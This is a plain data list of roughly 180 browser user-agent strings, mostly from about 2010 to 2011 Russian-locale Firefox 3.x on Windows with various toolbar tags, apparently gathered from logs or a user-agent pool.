Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03796) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03399) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03773) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03789) Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.4 (build 02647) Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) AskTbPTV2/3.9.1.14019 Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbSPC2/3.9.1.14019 Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.04 (lucid) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AlexaToolbar/alxf-2.0 MRA 5.7 (build 03791) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) AskTbPTV/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbFF/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03796) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTV2/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.7 (build 03796) Firefox/3.5.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03402) Firefox/3.6.13 GTB7.1 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03796) Firefox/3.6.12 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03402) Firefox/3.6.8 sputnik 2.0.1.37 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.5 (build 02842) Firefox/3.5.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 sputnik 2.3.0.102 s024vp
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 AskTbF-ET/3.9.1.14019 Firefox/3.0.19 GTB7.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.4 (build 02647) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 AskTbFXTV5/3.9.1.14019 Firefox/3.0.19 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03789) Firefox/3.6.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 AskTbFF/3.9.1.14019 Firefox/3.6.3 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.5 (build 02842) Firefox/3.5.16
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03278) Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.3a4pre) Gecko/20100323 MRA 5.5 (build 02842) Minefield/3.7a4pre (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 sputnik 2.3.0.96
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.04 (lucid) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.7 (build 03797) Firefox/3.5.11 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.5 (build 02842) Firefox/3.5.16 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03757) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) AskTbPTV2/3.9.1.14019 Firefox/3.6.13 sputnik 2.3.1.118 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.6 (build 03402) Firefox/3.5.16 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) AskTbPTV/3.9.1.14019 Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03790) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.13) Gecko/20101206 Ubuntu/9.10 (karmic) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03757) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03790) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.6 (build 03399) Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) AdCentriaIM/1.7 Firefox/3.6.13 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbFXTV5/3.9.1.14019 Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.3.0.66
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 AdCentriaIM/1.7 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbSPC2/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 MRA 5.7 (build 03796) Firefox/3.5.15 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13
Mozilla/5.0 (Windows NT 6.1; rv:2.0b8pre) Gecko/20101110 Firefox/4.0b8pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbNG2V5/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.1.118 FBSMTWB
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.6) Gecko/2009011913 MRA 5.7 (build 03789) Firefox/3.0.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 (.NET CLR 3.5.30729) sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 WebMoney Advisor FirePHP/0.4
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03402) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03757) AskTbPTV2/3.9.1.14019 Firefox/3.6.13 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.7 (build 03790) AskTbPTV/3.9.1.14019 Firefox/3.6.9 ( .NET CLR 3.5.30729) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03790) Firefox/3.6.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) ;ShopperReports
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1 sputnik 2.4.0.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 (.NET CLR 3.5.21022) sputnik unknown WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03658) Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03796) Firefox/3.6.8 ( .NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.7 (build 03796) Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03773) Firefox/3.5.16 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 GTB7.1 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) AskTbPTV2/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03791) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03392) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03797) Firefox/3.5.16 ( .NET CLR 3.5.30729) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.4.0.33
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03402) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.0.12) Gecko/20070508 Firefox/1.5.0.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03796) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbFXTV5/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) AskTbF-ET/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTV2/3.9.1.14019 Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 (.NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03790) Firefox/3.5.16 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbGLSV5/3.11.2.15536 Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02812) Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) AskTbPTV2/3.9.1.14019 Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.6 (build 03385) Firefox/3.5.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Ant.com Toolbar 2.0 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.4.0.33
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03757) Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.1.119
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.4.0.30
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110121 Firefox/3.6.14 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) Firefox/3.6.13 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 GTB7.1 sputnik 2.4.0.33
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 AdCentriaIM/1.7 Firefox/3.6.13 GTB7.1 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbNG1V5/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AlexaToolbar/alxf-2.01 Firefox/3.6.13 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) AskTbSPC2/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) AskTbPTV2/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbFXTV5/3.9.1.14019 Firefox/3.6.13 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) AskTbFF/3.8.0.12304 Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03672) Firefox/3.6.13 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729)
